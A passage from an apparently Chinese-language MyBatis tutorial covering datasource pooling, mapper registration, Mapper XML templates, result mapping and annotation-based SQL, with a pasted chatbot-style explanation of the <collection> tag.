<code>PooledDataSource</code> 连接池管理数据库连接</li><li>MyBatis 在启动时读取配置文件并初始化数据库连接。调用 <code>SqlSessionFactory.openSession()</code> 时，<code>SqlSessionFactory</code> 会从连接池中获取已有连接，而不是每次都重新建立连接。空闲连接会被保留在池中，以备后续使用。</li></ul></li><li><font color="#7030a0">UNPOOLED</font>：<ul><li>不使用连接池，适用于简单应用或测试环境</li><li>每次创建 <code>SqlSession</code> 时，MyBatis 都会建立新的数据库连接，并在会话结束时关闭该连接。每次请求都会创建并销毁连接</li></ul></li><li><font color="#7030a0">JNDI</font>：<ul><li>通过 JNDI 查找在容器中查找连接池，通常用于 Web 容器（如 Tomcat 或 JBoss）中，适合生产环境配置。</li></ul></li></ul></li></ol></blockquote><hr><h4 id="3-8-映射器"><a href="#3-8-映射器" class="headerlink" title="3.8. 映射器"></a>3.8. 映射器</h4><p>映射器用于<strong>注册 SQL 与 Mapper 之间的映射</strong>，简单理解为将 SQL 语句与 Mappper 接口的方法进行绑定，如果调用了方法，则会执行 SQL 语句。</p><p>注册的原则是：SQL 写在哪里，就注册在哪里。如果 SQL 写在 Mapper XML 映射文件中，就注册映射文件；如果 SQL 通过注解写在 Mapper 接口中，则注册 Mapper 接口。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 1. 通过资源文件加载 Mapper XML 文件 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;com/example/mapper/UserMapper.xml&quot;</span>/&gt;</span><br>  <br>  <span class="hljs-comment">&lt;!-- 2. 通过 URL 动态加载 Mapper XML 文件 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;http://example.com/mapper/UserMapper.xml&quot;</span>/&gt;</span><br>  <br>  <span class="hljs-comment">&lt;!-- 3. 通过 class 加载 Mapper 接口全类名 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.mapper.UserMapper&quot;</span>/&gt;</span><br>  <br>  <span class="hljs-comment">&lt;!-- 4. 批量加载某包内的所有 Mapper 接口（全类名） --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.example.mapper&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-Mapper-XML-映射文件-书写方法"><a href="#4-Mapper-XML-映射文件-书写方法" class="headerlink" title="4. Mapper XML 映射文件 书写方法"></a>4. Mapper XML 映射文件 书写方法</h3><h4 id="4-1-映射文件概述"><a href="#4-1-映射文件概述" class="headerlink" title="4.1. 映射文件概述"></a>4.1. 映射文件概述</h4><p>通常情况下，一个数据库表对应一个 Pojo 实体类；每个 Pojo 类对应一个 <code>Mapper</code> 接口；而每个 <code>Mapper</code> 接口则对应一个 Mapper XML 映射文件，用于定义具体的 SQL 映射关系。</p><hr><h4 id="4-2-文件基本结构"><a href="#4-2-文件基本结构" class="headerlink" title="4.2. 文件基本结构"></a>4.2. 文件基本结构</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">// 头文件<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta"><span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><br>// 对应 Mapper 接口的全类名（必须是全类名，不是 Pojo，是 Mapper 接口）<br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.MyMapper&quot;</span>&gt;</span><br>  // 1. 结果映射<br>  <br>  // 2. 插入操作<br>  <br>  // 3. 删除操作<br>  <br>  // 4. 修改操作<br>  <br>  // 5. 查询操作<br><br>  // 6. 可复用 SQL 片段<br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="4-3-结果映射模版"><a href="#4-3-结果映射模版" class="headerlink" title="4.3. 结果映射模版"></a>4.3. 结果映射模版</h4><p>在<strong>执行查询</strong>时（其他 SQL 没有这个烦恼），如果数据库的列名与 POJO 对象的属性名不一致（例如数据库中的 <code>user_name</code> 列与 POJO 中的 <code>name</code> 属性），MyBatis 默认情况下无法自动进行映射，这会导致查询结果无法正确赋值给 Java 对象的属性，或者 Java 对象的属性无法正确映射到数据库。</p><p>为了解决这个问题，我们通常使用 <strong>结果映射</strong> 来手动指定列名与属性名之间的对应关系。</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs qml">&lt;resultMap id=<span class="hljs-string">&quot;carResultMap&quot;</span> type=<span class="hljs-string">&quot;User&quot;</span>&gt;                <span class="hljs-comment">// 映射 User Pojo 对象</span><br>  &lt;id column=<span class="hljs-string">&quot;car_id&quot;</span> <span class="hljs-keyword">property</span><span class="hljs-string"></span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;                   <span class="hljs-comment">// id 列映射 id 属性</span><br>  &lt;result column=<span class="hljs-string">&quot;car_num&quot;</span> <span class="hljs-keyword">property</span><span class="hljs-string"></span>=<span class="hljs-string">&quot;carNum&quot;</span> /&gt;          <span class="hljs-comment">// car_num 列映射 carNum 属性</span><br>  &lt;result column=<span class="hljs-string">&quot;guide_price&quot;</span> <span class="hljs-keyword">property</span><span class="hljs-string"></span>=<span class="hljs-string">&quot;guidePrice&quot;</span> /&gt;  <span class="hljs-comment">// guide_price 列映射 guidePrice 属性</span><br>&lt;/resultMap&gt;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>在定义完结果映射后，可以在后续操作中放心大胆的直接<strong>使用数据库中的列名来编写 SQL 语句</strong>，而不是使用 POJO 的属性名。（千万注意是要以数据库中的列名而不是 POJO 的属性名，这一点非常重要。）</li><li>MyBatis 也提供了<strong>自动驼峰命名映射</strong>，即将带有下划线的数据库列名映射为驼峰命名的 Java 属性名，例如<code>user_name</code> 列会被自动映射为 <code>userName</code> 属性，无需我们在结果映射中进行复杂映射</li></ol></blockquote><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// 1. 原生 MyBatis 开启自动驼峰命名映射</span><br>&lt;setting <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;mapUnderscoreToCamelCase&quot;</span> value=<span class="hljs-string">&quot;true&quot;</span>/&gt;     <span class="hljs-comment">// 在 mybatis-config.xml 中配置</span><br><br><br><span class="hljs-comment">// 2. Spring Data MyBatis 开启自动驼峰命名映射</span><br>mybatis:                                                     <span class="hljs-comment">// 在 application.yaml 中配置</span><br>  configuration:  <br>    map-underscore-<span class="hljs-keyword">to</span>-camel-<span class="hljs-keyword">case</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>太好了，你问的这个是 MyBatis 映射中的一个关键点，直接关乎“一对多关系”如何在实体里表现出来。</p><hr><h3 id="1-标签是什么？"><a href="#1-标签是什么？" class="headerlink" title="1. &lt;collection&gt; 标签是什么？"></a>1. <code>&lt;collection&gt;</code> 标签是什么？</h3><p><code>&lt;collection&gt;</code> 是 MyBatis 的 resultMap 配置里的一个标签，用来映射<strong>一对多关联关系</strong>，把数据库查询的多条“多”的数据，自动装配到实体对象的集合属性里。</p><hr><h3 id="2-你的例子："><a href="#2-你的例子：" class="headerlink" title="2. 你的例子："></a>2. 你的例子：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;authorities&quot;</span> <span class="hljs-attr">ofType</span>=<span class="hljs-string">&quot;string&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;authoritie_name&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>property&#x3D;”authorities”</strong><br>  表示在你的 Java 实体类里，有一个叫 <code>authorities</code> 的属性，通常是个 <code>List</code> 或 <code>Set</code>，用来存放权限集合。</p></li><li><p><strong>ofType&#x3D;”string”</strong><br>  表示 <code>authorities</code> 集合里存放的元素类型是 <code>String</code>，也就是权限名字（比如 <code>&quot;ROLE_USER&quot;</code>，<code>&quot;ROLE_ADMIN&quot;</code>）。</p></li><li><p><strong>column&#x3D;”authoritie_name”</strong><br>  这是 SQL 结果集中对应的列名，也就是说，MyBatis 会从查询结果的 <code>authoritie_name</code> 这一列拿数据，一条记录对应一个权限字符串，自动放进 <code>authorities</code> 集合里。</p></li></ul><hr><h3 id="3-为什么要用-？"><a href="#3-为什么要用-？" class="headerlink" title="3. 为什么要用 &lt;collection&gt;？"></a>3. 为什么要用 <code>&lt;collection&gt;</code>？</h3><p>假设你查一个用户和他所有权限（多条权限）是多条数据库记录，比如：</p><table><thead><tr><th>user_id</th><th>username</th><th>…</th><th>authoritie_name</th></tr></thead><tbody><tr><td>1</td><td>alice</td><td>…</td><td>ROLE_USER</td></tr><tr><td>1</td><td>alice</td><td>…</td><td>ROLE_ADMIN</td></tr></tbody></table><p>如果没有 <code>&lt;collection&gt;</code>，MyBatis 默认每条记录会映射成一个 User 对象，数据重复。</p><p>有了 <code>&lt;collection&gt;</code>，MyBatis 会自动把多条权限合并到一个 User 实例的 <code>authorities</code> 集合里，<strong>避免重复，方便后续使用</strong>。</p><hr><h3 id="4-你对应的实体里-authorities-应该是这样："><a href="#4-你对应的实体里-authorities-应该是这样：" class="headerlink" title="4. 你对应的实体里 authorities 应该是这样："></a>4. 你对应的实体里 <code>authorities</code> 应该是这样：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;String&gt; authorities;<br></code></pre></td></tr></table></figure><hr><h3 id="总结一句话："><a href="#总结一句话：" class="headerlink" title="总结一句话："></a>总结一句话：</h3><p><code>&lt;collection&gt;</code> 就是告诉 MyBatis，“这里有个一对多的集合字段，帮我从多行数据的某列提取值，装进实体的集合属性里。”</p><hr><p>你还想要我帮你写个简单示例代码或流程图，方便理解吗？</p><hr><h4 id="4-4-插入操作模版"><a href="#4-4-插入操作模版" class="headerlink" title="4.4. 插入操作模版"></a>4.4. 插入操作模版</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;uniqueId&quot;</span>                      &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">必须</span>：<span class="hljs-attr">SQL</span> <span class="hljs-attr">唯一标识</span>，<span class="hljs-attr">对应</span> <span class="hljs-attr">Mapper</span> <span class="hljs-attr">接口的方法</span>（<span class="hljs-attr">两者一致</span>） <span class="hljs-attr">--</span>&gt;</span></span><br><span class="language-xml">  parameterType=&quot;parameterType&quot;      <span class="hljs-comment">&lt;!-- 可选：输入参数的类型 --&gt;</span></span><br><span class="language-xml">  keyProperty=&quot;keyProperty&quot;          <span class="hljs-comment">&lt;!-- 可选：主键属性（主键回显时使用） --&gt;</span></span><br><span class="language-xml">  keyColumn=&quot;keyColumn&quot;              <span class="hljs-comment">&lt;!-- 可选：主键列（主键回显时使用）  --&gt;</span></span><br><span class="language-xml">  useGeneratedKeys=&quot;true|false&quot;      <span class="hljs-comment">&lt;!-- 可选：是否使用自动生成的键（主键回显时使用）  --&gt;</span></span><br><span class="language-xml">  timeout=&quot;timeoutValue&quot;&gt;            <span class="hljs-comment">&lt;!-- 可选：SQL 语句的超时时间 --&gt;</span></span><br><span class="language-xml">  <span class="hljs-comment">&lt;!-- 任意的 SQL 插入语句--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：输入参数的类型</p><ol><li>如果参数是简单类型、包装类，无论传几个参数，我们不用指定 <code>parameterType</code></li><li>如果是 <code>entity</code> 或者其他对象，我们一定要具体到<strong>全限定类名</strong>或<strong>类别名</strong>，例如：<code>User</code></li><li>其他的还有 array、list、set、map</li></ol></blockquote><hr><h4 id="4-5-删除操作模版"><a href="#4-5-删除操作模版" class="headerlink" title="4.5. 删除操作模版"></a>4.5. 删除操作模版</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">delete</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;uniqueId&quot;</span>                      &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">必须</span>：<span class="hljs-attr">SQL</span> <span class="hljs-attr">唯一标识</span>，<span class="hljs-attr">对应</span> <span class="hljs-attr">Mapper</span> <span class="hljs-attr">接口的方法</span>（<span class="hljs-attr">两者一致</span>） <span class="hljs-attr">--</span>&gt;</span></span><br><span class="language-xml">  parameterType=&quot;parameterType&quot;      <span class="hljs-comment">&lt;!-- 可选：输入参数的类型 --&gt;</span></span><br><span class="language-xml">  timeout=&quot;timeoutValue&quot;&gt;            <span class="hljs-comment">&lt;!-- 可选：SQL 语句的超时时间 --&gt;</span></span><br><span class="language-xml">  </span><br><span class="language-xml">  <span class="hljs-comment">&lt;!-- 任意的 SQL 删除语句 --&gt;</span></span><br><span class="language-xml">  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h4 id="4-6-修改操作模版"><a href="#4-6-修改操作模版" class="headerlink" title="4.6. 修改操作模版"></a>4.6. 修改操作模版</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;uniqueId&quot;</span>                      &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">必须</span>：<span class="hljs-attr">SQL</span> <span class="hljs-attr">唯一标识</span>，<span class="hljs-attr">对应</span> <span class="hljs-attr">Mapper</span> <span class="hljs-attr">接口的方法</span>（<span class="hljs-attr">两者一致</span>） <span class="hljs-attr">--</span>&gt;</span></span><br><span class="language-xml">  parameterType=&quot;parameterType&quot;      <span class="hljs-comment">&lt;!-- 可选：输入参数的类型 --&gt;</span></span><br><span class="language-xml">  flushCache=&quot;true|false&quot;            <span class="hljs-comment">&lt;!-- 可选：是否刷新缓存 --&gt;</span></span><br><span class="language-xml">  timeout=&quot;timeoutValue&quot;&gt;            <span class="hljs-comment">&lt;!-- 可选：SQL 语句的超时时间 --&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-comment">&lt;!-- 任意的 SQL 修改语句 --&gt;</span></span><br><span class="language-xml">  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h4 id="4-7-查询操作模版"><a href="#4-7-查询操作模版" class="headerlink" title="4.7. 查询操作模版"></a>4.7. 查询操作模版</h4><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;uniqueId&quot;</span>                         &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">必须</span>：<span class="hljs-attr">SQL</span> <span class="hljs-attr">唯一标识</span>，<span class="hljs-attr">对应</span> <span class="hljs-attr">Mapper</span> <span class="hljs-attr">接口的方法</span>（<span class="hljs-attr">两者一致</span>） <span class="hljs-attr">--</span>&gt;</span></span><br><span class="language-xml">  parameterType=&quot;parameterType&quot;         <span class="hljs-comment">&lt;!-- 可选：输入参数的类型 --&gt;</span></span><br><span class="language-xml">  resultType=&quot;resultType&quot;               <span class="hljs-comment">&lt;!-- 可选：返回结果的类型（int、Pojo、java.util.Map） --&gt;</span></span><br><span class="language-xml">  resultMap=&quot;resultMapId&quot;               <span class="hljs-comment">&lt;!-- 可选：自定义结果映射（前面定义的结果映射的 ID） --&gt;</span></span><br><span class="language-xml">  timeout=&quot;timeoutValue&quot;&gt;               <span class="hljs-comment">&lt;!-- 可选：SQL 语句的超时时间 --&gt;</span></span><br><span class="language-xml">  </span><br><span class="language-xml">  <span class="hljs-comment">&lt;!-- 任意的 SQL 查询语句 --&gt;</span></span><br><span class="language-xml">  </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h4 id="4-8-可复用-SQL-片段模版"><a href="#4-8-可复用-SQL-片段模版" class="headerlink" title="4.8. 可复用 SQL 片段模版"></a>4.8. 可复用 SQL 片段模版</h4><p>妈的，这里面也能写 sql，进行简化重复编写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>  <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span>  </span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span>  </span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.example.malltinymybatis.mapper.UmsAdminMapper&quot;</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.example.malltinymybatis.model.entity.UmsAdmin&quot;</span>&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;BIGINT&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nick_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;note&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;note&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;loginTime&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;login_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span>/&gt;</span>  <br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span>/&gt;</span>  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">sql</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Base_Column_List&quot;</span>&gt;</span>  <br>        id,username,password,        <br>        icon,email,nick_name,        <br>        note,create_time,login_time,        <br>        status    <br><span class="hljs-tag">&lt;/<span class="hljs-name">sql</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-注解式-SQL-书写方法"><a href="#5-注解式-SQL-书写方法" class="headerlink" title="5. 注解式 SQL 书写方法"></a>5. 注解式 SQL 书写方法</h3><h4 id="5-1-插入-SQL"><a href="#5-1-插入-SQL" class="headerlink" title="5.1. 插入 SQL"></a>5.1. 插入 SQL</h4><h5 id="5-1-1-常规插入"><a href="#5-1-1-常规插入" class="headerlink" title="5.1.1. 常规插入"></a>5.1.1. 常规插入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <br>    <span class="hljs-meta">@Insert(&quot;INSERT INTO user (name, age) VALUES (#&#123;name&#125;, #&#123;age&#125;)&quot;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertUser</span><span class="hljs-params">(User user)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="5-1-2-主键回显"><a href="#5-1-2-主键回显" class="headerlink" title="5.1.2. 主键回显"></a>5.1.2. 主键回显</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Mapper</span><br>public interface UserMapper &#123;<br><br>    <span class="hljs-variable">@Insert</span>(<span class="hljs-string">&quot;INSERT INTO user (name, email) VALUES (#&#123;name&#125;, #&#123;email&#125;)&quot;</span>)<br>    <span class="hljs-variable">@Options</span>(useGeneratedKeys = true, keyProperty = <span class="hljs-string">&quot;id&quot;</span>, keyColumn = <span class="hljs-string">&quot;user_id&quot;</span>)<br>    void <span class="hljs-built_in">insertUser</span>(User user)<br>    <br>&#125;<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;@Insert&#x3D;&#x3D;：<ol><li>执行插入操作的注解</li></ol></li><li>&#x3D;&#x3D;@Options&#x3D;&#x3D;：<ol start="2"><li><font color="#00b0f0">useGeneratedKeys&#x3D;true</font>:<ol><li>告诉 MyBatis 去启用 <strong>自动获取数据库生成的主键</strong>。</li></ol></li><li><font color="#00b0f0">keyProperty&#x3D;”id”</font>:<ol start="2"><li>告诉 MyBatis <strong>将生成的主键值赋值给 Pojo 对象的 <code>id</code> 属性</strong></li></ol></li><li><font color="#00b0f0">keyColumn&#x3D;”user_id”</font>:<ol start="3"><li>显式指定数据库中的主键列名，适用于 Java 对象的主键属性与数据库表中的主键列名不一致的情况。</li><li>如果 <code>keyColumn</code> 与 <code>keyProperty</code> 相同，则可以省略 <code>keyColumn</code> 配置。</li></ol></li></ol></li></ol><hr><h4 id="5-2-删除-SQL"><a href="#5-2-删除-SQL" class="headerlink" title="5.2. 删除 SQL"></a>5.2. 删除 SQL</h4><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserMapper</span> </span>&#123;<br><br>    <span class="hljs-meta">@Delete</span>(<span class="hljs-string">&quot;DELETE FROM user WHERE id = #&#123;id&#125;&quot;</span>)<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deleteById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="5-3-修改-SQL"><a href="#5-3-修改-SQL" class="headerlink" title="5.3. 修改 SQL"></a>5.3. 修改 SQL</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">@Mapper</span><br><span class="hljs-keyword">public</span> interface <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    <span 